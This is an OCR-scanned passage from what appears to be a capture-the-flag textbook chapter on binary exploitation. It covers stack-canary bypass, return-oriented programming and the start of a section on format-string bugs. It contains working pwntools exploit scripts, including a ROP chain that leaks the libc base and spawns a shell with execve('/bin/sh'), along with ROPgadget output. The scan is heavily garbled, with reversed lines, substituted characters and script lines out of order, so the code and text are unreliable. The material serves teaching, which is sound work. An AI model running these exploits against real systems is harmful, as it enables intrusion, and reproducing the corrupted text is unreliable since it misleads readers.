leave
9735
:）//startsat4oe6Bs
retn
SE6
endp
Fig, 6.10 vuln code segment 2
>>>> p-sendline (*a'+10)
'input 1:\n*
>>>>p.recvunti1 (*a′*10+ *\n′)
{] Aosx d+,0ox\, = Axeueo >> canary
# Leak canary
In the next input, you can write the leaked Canary to the original address, and then
continue to overwrite the return address.
>>>>she11_addx = p64 (0x400677)
>>>> p . send1ine (*a'+10+canary+p64 (0) +p64 (ehe11_addx) )
---
## Page 456
mogsno p9s9
443
[+] Svitching to interactive mode
>>>> p .interactive ()
core exp -py stack stack2 stack c
1s
The above example illustrates that even if the compiler has Canary, you still need
to take care to prevent stack overflows when writing your program. Otherwise, it
may be exploited by attackers, which can cause serious consequences.
3. dangerous functions
By looking for dangerous functions, we can quickly determine if a program may
have a stack overflow. Some of the common hazard functions are listed below.
• Inputs: gets( ), reads a line up to the character “n', while "n’ is converted to
“x00’; scanf( ), formats string %s (%s does not check the length); vscanf( ), as
above.
Output: sprintf( ), which writes the formatted content to the buffer, but does not
check the buffer length.
o u xou nou saop p st ox, um sdos ( )ds suns
lead to off-by-one (overflow a single null byte); strcat( ), as above.
4. exploitable stack overflow
There are typically three types of exploitable stack overflow.
① Overwrite the function retum address.
② Overwrite the BP register values stored on the stack. When the function is called,
it will first save the stack pointer, and then recover it when it retums, as follows
(for example, in an x64 program).
pushrbp
mov  rbp, rep
leave
;equivalent to nov rsp, rbp pop rbp
ret
If the BP value on the stack is overwritten, the BP value of the parent function will
be changed after the function retums. The SP of parent function will not point to the
modified BP location instead of original return address.
③ Overriding the contents of a particular variable or address may lead to some
logical vulnerability
---
## Page 457
444
6PWN
6.4Return-Oriented Programming
Modern operating systems have MPU mechanisms to set memory permissions for
processes by pages. Memory permissions are readable (R), writable (W), and
executable (X). As soon as the CPU executes code on memory with no executable
permissions, the operating system will terminate the program immediately.
Based on the rules of vulnerability mitigation, there is no memory in the program
with both writable and executable permissions. It is not possible to execute shellcode
by modifying a code segment or data segment of the program. To bypass the
vulnerability mitigation mechanism, there is an atack technique called Return-
Oriented Programming (ROP), which controls the execution flow of the program
by retuming to a specific sequence of instructions in the program. This section
describes how this technique can be used to implement the execution of arbitrary
instructions in a vulnerable program.
Section 6.3 describes the principle of stack overflow and the hijacking of the
program’s control flow by overwriting the retum address, and jumping to the shell
function to execute arbitrary commands via the ret instruction. However, such a shell
function cannot exist in a program. It is possible to build an ROP chain by using the
instruction fragments (gadget) with end of the ret (0xc3) instruction to achieve
arbitrary code execution. Firstly, find all the ret instructions in the executable
memory of the program, then check if the byte before ret contains a valid instruction.
If so, mark the code fragment as an available Gadget. After finding a series of such
instructions ending with ret, put the addresses of these Gadgets on the stack in order.
After the Gadget, the ret instruction will bring PC to the next Gadget’s address which
at the top of the stack. This sequence of Gadgets on the stack forms a ROP chain,
which does arbitrary instruction execution.
1. Find the gadget
Theoretically, ROP is Turing-complete. The following types of Gadgets are com-
monly used for exploits.
• Move data in stack to a register, such as.
pop rax; ret;
•System calls, such as.
syscall; ret;
int 0x80;  ret;
•Gadget that affects the stack frame, such as.
leave;  ret;
pop rbp: ret ;
---
## Page 458
6.4 Retum-Oriented Programming
445
There are some methods for finding Gadget, looking for the ret instruction in the
program and seeing if there is a desired sequence of instructions before ret. You can
also use tools such as ROPgadget, Ropper, etc.s
2. Retum-oriented programming
Example 6.3
#include
#include
int main(1 {
char buf [10] ;
puts (*hello") ;
gets (buf) ;
Compile with the following command.
xoqoaqoxd-xoeqs -oug - atd-ou- dox o- o- dox oob
The difference from the previous example of stack overflow is that there are no
functions preconfigured in the program that can be used to execute commands.
Firstly, use ROPgadget to find Gadgets in this program.
ROPgadget --binary rop
Then we can get the following Gadget.
gadgets information
0x00000000004004ae : adc byte ptr [rax] , ah ; jmp rax
0x0000000000400479 : add ah, dh ; nop dword ptr [rax + rax] : ret
0x000000000040047f : addb1, dh ; zet
0x000o0000004005dd : add byte ptr [rax] , al ; add b1, dh ; ret
0x0oooooooo040o5db : add byte ptx [rax] , al :; add byte ptr [rax] , al ; add
b1, dh ; ret
0x00ooo0ooo040055d : add byte ptr [rax] , al ; add byte ptr [rax] , al ;
0x000o0000004005dc : add byte ptx [rax] , al ; add byte ptr [rax] , al ; ret
leave ; ret
0x000000000040055e : add byte ptr [rax] , al ; add c1, cl ; ret
0x00ooo0oo004004b6 : add byte ptr [rax] , al : pop rbp : ret
0x000000000040055f : add byte ptr [rax] , al ; leave ; ret
0x000000000040047e : add byte ptr [rax] , al ; ret
0x000o0000004004b5 : add byte ptr [rax] , r8b : pop rbp : ret
0x000000000040047d : add byte ptx [rax] , r8b ; ret
0x000o000000400517 : add byte ptr [rcx] , al : pop rbp : ret
0x0000000000400560 : add c1, cl ; ret
0x0000000o00400518 : add dword ptr [rbp - 0x3d] , ebx ; nop dword ptr [rax +
rax] ; ret
---
## Page 459
446
6PWN
0x0000000000400413 : add esp, 8 ; ret
0x0000000000400412 : add rsp, 8 ; zet
0x00000o00o0400478 : and byte ptr [rax] , al ; hlt ; nop dvord ptr [rax +
0x0000000000400409 : and byteptr [rax] , al ; test rax, zax : je 0x400419 ;
rax]; ret
0x00000000004005b9 : ca11 qword ptx [r12 + rbx*8]
ca11 rax
0x0000000000400410 : ca11 rax
0x00oo0000004005ba : ca11 qword ptx [rsp + rbx*8]
0x000o0000004005bc : fmul qword ptx [rax - 0x7d] : ret
0x000000000040047a : hlt ; nop duord ptz [rax + rax] : ret
0x000000000040040e : je 0x400414 ; ca11 zax
0x00000000004004a9 : je 0x4004c0 : pop rbp : mov edi, 0x601038 : jmp rax
0x00000000004004eb : je 0x400500 ; pop rbp : mov edi, 0x601038 : Jmp xax
0x00000000004004b1 : jmp rax
0x0000000000400512 : mov byte ptx [rip + 0x200b1f] , 1 : pop rbp : ret
0x0000000000400561 : 1eave ; ret
0x00000000004004ac : mov edi, 0x601038 ; jap rax
0x000000000040055c : mov eax, 0 ; leave ; ret
0x0000000000400sb7 : mov edi, ebp ; ca11 qword ptx [r12 + rbx*8]
0x0oooo0ooo04004b3 : nop dword ptr [rax + rax] : pop rbp : ret
0x0000000000400sb6 : mov edi, zr13d ; ca11 quord ptz [r12 + rbx*8]
0x0000000o004004fs : nop dword ptx [rax] : pop zbp : ret
0x000000000040047b : nop dword ptx [rax + rax] : ret
0x00o00oo0o0400515 : or esp, dwordptr [rax] : add byte ptx [zcx] , al ; pop
0x00000000o04005b8 : out dx, eax ; ca11 quord ptx [r12 + rbx*8]
rbp ; ret
0x00000000004005cc : pop r12 : pop r13 ; pop r14 : pop r15 ; ret
0x00000000004005ce : pop r13 : pop r14 : pop r15 ; ret
1ax : stx dod : tx dod : ops0000o00o0000x0
0x00000000004005d2 : pop r15 ; ret
0x00000000004004ab : pop rbp : mov edi, 0x601038 : jnp rax
0x00ooo0ooo04005cf : pop rbp : pop r14 : pop r15 : zet
0x000o0000004005cb : pop rbp : pop r12 ; pop r13 : pop r14 : pop z15 ; ret
0x00000000004004b8 : pop rbp : ret
0x00000000004005d3 : pop rdi ; ret
0x00000000004005d1 : pop rs1 : pop r15 ; ret
0x000o0000004005cd : pop rap : pop r13 : pop r14 : pop r15 : ret
0x000000000040040d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000400416 : ret
0x00000000004005e5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004005e4 : sub rsp, 8 ; add rsp, 8 ; ret
0x00o00o00o04005da : test byte ptr [rax] , al ; add byte ptx [rax] , al ; add
byte ptr [rax] , al ; ret
0x000000000040040c : test eax, eax : je 0x400416 : ca11 rax
0x000000000040040b : test rax, rax : je 0x400417 : ca11 rax
Unique gadgets found : 58
The program is small and only has a few of Gadgets. There is no syscall Gadget
that can be used to execute system calls, so it is difficult to implement arbitrary code
execution. However, you can find a way to get the load address of some dynamic
---
## Page 460
6.4 Retum-Oriented Programming
447
plt:0000000000400430
plt:0000000000400430
-plt:0000000000400430
；Attributes: thunk
-plt:0000000080400430
；int puts(const char *s)
-plt:0000000080400430
plt:0000000000400430
_puts
proc near
jmp
cs:off_601018
-plt:0000000080400430
-plt:0000000000400430
_puts
endp
-plt:0000000080400436
Fig, 6.11 The PLT of puts
pt.plt:0000
got.plt:00000000006e1000;Segment
_got_plt
permissions: Read/write
segment qword public ‘DATA' use64
-got.plt:
assume csi_got_plt
got.plt:
got.plt:
0000000601000
_GLOBAL_OFFSET_TABLE_
got.plt:00000000006e10es
qword_601008
dq e
dq offset _pYwIC
;DATA XREF: sub_4004
got.plt:000000000601018 off_601018
got.plt:0000
N000000601010
quord_601010
dq 0
;DATA REF: Sub_4004
dq offset puts
DATA xREF: _getstr
DATA XREF:
got.plt:0000000000601020
dq offset gets
_putstr
got.plt:0000000000601020
off_601020
-got.plt:000
got_plt
ends
Fig, 6.12 The .GOT.PLT of puts
library (such as libc) and then use the Gadget in libc to construct a ROP that can
execute arbitrary code.
When the program calls the library function, it will read the address of the
corresponding function in GOT table and then jump to the address (see Fig. 6.11).
So, we can use the puts function to print the address of the library function. Then
subtract the offset of this library function from the libc load base address to calculate
the libc base address.
The GOT table in the program is shown in Fig. 6.12. The address of the puts
function is stored at 0x601018. If puts(0x601018) is called, the address of the puts
function in libc will be printed.
>>>> fron pwm import +
>>> p=process (* . /zop′)
[x]  Starting local process ' . /rop′
[+] Starting local process ' . /rop* : pid 4685
EPsooxo = Tpxdod>>> p -send1ine (*a1+18+p64 (pop_rdi) +p64 (puts_got) +p64 (puts) )
>>>> p -recvunti1 (*\n′)
>>>> addr = u64 (p . recv [6) 1just (8, \,x00 ′) )
'hello`n'
(xppe]xaq <<<<
10x7fcd606e19c0
---
## Page 461
448
6PWN
Based on the offset of the puts function in the libc, you can calculate the base
address of libc in memory. Then use the Gadget in libc to execute the system(°/bin/
sh°) to get the shell. This can be done using the syscall. The method of calling the
system function is similar to the previous one, so we will demonstrate it here using
system calls instead.
By querying the system call table, you can see that the system call number of
execve is 59, and you need to set the parameter to the following if you want to
execute any command.
execve (#/bin/sh*, 0, 0)
The string */bin/sh" can be found in libc and does not need to be constructed.
Although the data in the registers cannot be rewriten directly. We can write to the
registers via the Gadget of the pop instruction. In this example, the registers needed
are RAX, RDI, RSI, RDX, and you can find the required Gadget in libc.
0x00000000000439c8 : pop rax ; ret
0x0000000o00023e6a : pop rai : ret
0x000000000002155f : pop rdi ; ret
0x0000000000001b96 : pop rdx ; ret
0x000o0000000d2975 : syscal1 ; ret
ord s gonuoo oi si das jxou ou ssappe uooun eaq o Sugea ray
 enqe anpe on uu do mou e nd uo an je os uoon u o
execution.
The full script is as follows.
from pum import *
p=process (* . /rop')
elf=ELF(. /rop*)
pop_rdi = 0x4005d3
libc = elf.1ibc
puts_got = 0x601018
puts = 0x400430
main = 0x400537
rop1 += p64 (pop_zdi)
ropl = "a"+18
rop1 += p64 (puts_got)
rop1 += p64 (puts)
rop1 += p64 (main)
p.sendline (rop1)
p.recvunti1(*\n′)
1ibc_base = addr - 1ibc. symbols [ 'puts′]
addr = u64 (p recv (6) . 1just (8, *\,x0o′) 1 )
info ("1ibc: 0xvx*, libc_base)
pop_zax = 0x00000000000439c8 + 1ibc_base
pop_rdi = 0x000000000002155f + 1ibc_base
pop_rsi = 0x0000000000023e6a + 1ibc_base
pop_rdx = 0x0000000000001b96 + 1ibc_base
---
## Page 462
6.5 Format String Vulnerabilities
449
sysca11 = 0x00000000000d2975 + 1ibc_base
binsh = next (1ibc.search (*/bin/sh*) , 1 + 1ibc_base
# Search for the address of the string */bin/sh" in libc.
rop2 += p64 (pop_rax)
rop2 = "a"+18
rop2 += p64 (pop_rd1)
rop2 += p64 (59)
rop2 += p64 (binsh)
rop2 += p64 (pop_rs1)
rop2 += p64 (pop_zdx)
rop2 += p64 (0)
rop2 += p64 (aysca11)
rop2 += p64 (0)
p .recvunti1 ("hel1o\n*)
p .sendline (rop2)
p . interactive ()
The basic introduction of ROP is as above. You can follow the above example to
trace the execution of ROP in the debugger with single step, which will give a better
understanding of the ROP. More advanced usage of ROP, such as loop selection,
needs to modify the RSP value according to certain conditions to realize. You can try
it by yourself.
6.5 Format StringVulnerabilities
6.5.1FormatStringVulnerabilityFundamental
Commonly used formatting functions in C are as follows.
int printf (const char +format, .--) :
int fprintf (FIL& *stzean, conat char *format, ---) :
int sprintf (char *str, const char +format,
int snprintf (char *str, size_t size, const char *format, -.-);
They are used in a similar way. This section takes printf as an example. In C, the
usage of printf is:
printf ("4s\n", "hello vorld!*) ;
printf ("number:vd`,n*, 1) ;
A string with placeholders such as %d, %s, etc. The first argument of the function is
format string, and the placeholders are used to specify how the output parameter
values will be formatted.
---
## Page 463
450
6PWN
The syntax of the placeholder is.
$ [parameter] [fage] [field width] [ ,precision][length] type
parameter can be ignored or is “nS", where n indicates which parameter will be
passed in.
The flags may consist of:
•+  Indicates the sign °+” or ^-' for number, ignores positive signs by default, and
applies only to numeric types.
• Space  Output of a signed number prefixed with one space if there is no sign for
number or if the output length is 0.
• - left-aligned, the output is right-aligned by default.
‘,°, *d °J, noj uosoand oj souaz Suen anoua jou op °D, pue 3, Jog #*
‘g', °G', always output the decimal point; for *o”, °x', X', output the prefixes
0, Ox, and 0X before non-zero values to represent the number system.
• 0  before the width option, indicates that the output will fill with 0.
The field width indicates the minimum width of the output, which is used to fill a
fixed width when outputting. If the actual length of output is less than the field width,
it is filled according to left- aligned or right- aligned, and the *-' is interpreted as the
left-aligned flag. If the field width is set to **, then the value of the corresponding
parameter is the current field width.
particular formatting type.
Precision usually specifies the maximum length of the output, depending on the
• For integer values of d, i, u, x, o, it indicates that the insufficient buffer is filled
•For the float values of a, A, e, E, f, and F, it indicates the number of digits